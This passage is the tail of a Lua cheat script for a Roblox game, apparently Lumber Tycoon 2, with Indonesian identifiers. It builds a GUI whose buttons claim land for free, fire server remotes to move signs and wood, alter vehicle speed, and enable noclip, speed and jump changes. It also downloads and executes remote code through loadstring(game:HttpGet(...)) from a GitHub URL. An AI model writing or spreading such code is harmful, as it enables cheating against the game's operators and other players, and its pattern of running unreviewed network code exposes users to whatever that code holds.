Slottab:Button("Save Slot", "Save", 0.1, function()
    UI:Notif("Proses")
    game:GetService("ReplicatedStorage").LoadSaveRequests.RequestSave:InvokeServer(slotarget,player)
    UI:Notif("Done")
end)
Slottab:Label("Property")
local landkebutuhan = loadstring(game:HttpGet("https://raw.githubusercontent.com/WilliamAbon/TRLT2/refs/heads/main/kebutuhan.lua"))()
Slottab:Button("Get 1 Land Free", "Get", 0.1, function()
    local land = nil
    for _,v in pairs(workspace.Properties:GetChildren()) do
        if v:FindFirstChild("Owner") and v:FindFirstChild("Owner").Value == nil then
            land = v
        end
    end
    if land ~= nil then
        landkebutuhan.BeliLandGratis(land)
    end
end)

Slottab:Button("Full Land", "Full", 0.1, function()
    landkebutuhan.FullLandGratis()
end)

Slottab:Button("Sell Sing", "Sell", 0.1, function()
    local Sign = nil
    for _, v in pairs(workspace.PlayerModels:GetChildren()) do
        if v:FindFirstChild("Owner") then
            if v:FindFirstChild("Owner").Value == player and v:FindFirstChild("TreeClass") and v.TreeClass.Value == "Sign" then
                if v:FindFirstChild("Main") then
                    Sign = v
                    if v:FindFirstChild("Main").Anchored == true then
                        local ClientInteracted = game:GetService("ReplicatedStorage").Interaction.ClientInteracted
                        ClientInteracted:FireServer(v, 'Take down sold sign')
                    end
                end
            end
        end
    end
    if Sign then
        local savepos = char:GetPivot()
        char:PivotTo(Sign:GetPivot() * CFrame.new(3,0,0))
        for i=1,5 do
            spawn(function() 
                BringWoodToPos(Sign, CFrame.new(315, 3, 85))
            end)
        end
        char:PivotTo(savepos)
        savepos = nil
        UI:Notif("Done")
    end
end)

Mobiltab:Label("Vehicle")

Mobiltab:TextBoxNum("Speed","1",function(s)
    for _,v in pairs(workspace.PlayerModels:GetChildren()) do
        if v:IsA("Model") and v:FindFirstChild("Owner") and v:FindFirstChild("Configuration") and v:FindFirstChild("DriveSeat") then
            if v:FindFirstChild("Type").Value == "Vehicle" then
                v:FindFirstChild("Configuration"):FindFirstChild("MaxSpeed").Value = tonumber(s) or 1
            end
        end
    end
end)

Mobiltab:Button("Flip Vehicle", "Flip", 0.1, function()
    if char.Humanoid.Sit == true then
        local car = char.Humanoid.SeatPart.Parent
        if car:FindFirstChild("Type") and car:FindFirstChild("Type").Value == "Vehicle" then
            local mr = math.rad
            local cfbaguflip = CFrame.Angles(mr(180),0,0) * CFrame.new(0,-3,0)
            car:PivotTo(car:GetPivot() * cfbaguflip)
        end
    end
end)
--[[
local tablewarnamobil = {
	[1] = 'Medium stone grey',
	[2] = 'Dark grey metallic',
	[3] = 'Dark grey',
	[4] = 'Silver',
	[5] = 'Sand green',
	[6] = 'Faded green',
	[7] = 'Sand red',
	[8] = 'Dark red',
	[9] = 'Earth yellow',
	[10] = 'Earth orange',
	[11] = 'Brick yellow',
	[12] = 'Hot pink',
}
local mobiltargetwarna = ""
local sedangpilih = false
local butonCarbagu
Mobiltab:Label("Spawner")
local mm = Mobiltab:Selection("Select Color", function(text)
    mobiltargetwarna = text
end)

butonCarbagu = Mobiltab:Button("Start Spawn", "Start", 0.1, function()
    if sedangpilih == false then
        if mobiltargetwarna == "" then
            UI:Notif("Car Color?")
        else
            UI:Notif("Click Car Spawn Location")
            for a,v in butonCarbagu do
                print(a)
            end
            butonCarbagu:ChangeText("Cancel")
            sedangpilih = true
            moduleClick.Setup("PickInstance", function(Ins)
                if Ins.Name == "Main" or Ins.Name == "SpawnButton" then
                    if Ins.Parent:FindFirstChild("VehicleName") and Ins.Parent:FindFirstChild("Type") and Ins.Parent:FindFirstChild("Type").Value == "Vehicle Spot" then
                        butonCarbagu:ChangeText("Start")
                        sedangpilih = false
                        UI:Notif("Proses")
                        moduleClick.Cleanup("PickInstance")
                    end
                end
            end)
        end
    elseif sedangpilih == true then
        butonCarbagu:ChangeText("Start")
        sedangpilih = false
        moduleClick.Cleanup("PickInstance")
    end
    --sedangpilih = not sedangpilih
end)


for _, v in tablewarnamobil do
    mm:Add(v)
end]]

CheckToDis(RunService.Stepped:Connect(function()
    if TABLESETTING["Noclip"] then
        for k, v in pairs(char:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
    end
    if hum and char:FindFirstChild("Humanoid") then
        local h = hum or char:FindFirstChild("Humanoid")
        h.WalkSpeed = TABLESETTING.WalkSpeed
        h.JumpPower = TABLESETTING.JumpPower
    end
end))

CheckToDis(RunService.RenderStepped:Connect(function()
    if TABLESETTING["Day"] then
        game.Lighting.ClockTime = 11.389166831970215
    end
    if TABLESETTING["Night"] then
        game.Lighting.ClockTime = 19.90305519104004
    end
    if TABLESETTING["RemoveFog"] then
        game.Lighting.FogEnd = math.huge
    end
    if TABLESETTING["WalkOn"] then
        for _,v in pairs(workspace.Water:GetChildren()) do
            if v.Name == "Water" then
                v.CanCollide = true
            end
        end
    end
end))



Home:FirstOpen()
game:GetService("CoreGui").TRLT_DuaScreen.Destroying:Connect(function()
    if awal then
        awal:Disconnect()
        awal = nil
    end
    if conneantiafk then
        conneantiafk:Disconnect()
        conneantiafk = nil
    end
    for _,v in ipairs(wdisw) do
        if v then
            v:Disconnect()
            v = nil
        end
    end
    wdisw = nil
end)

win:Showing()
UI:Notif("Script TRLT2 Terload!")
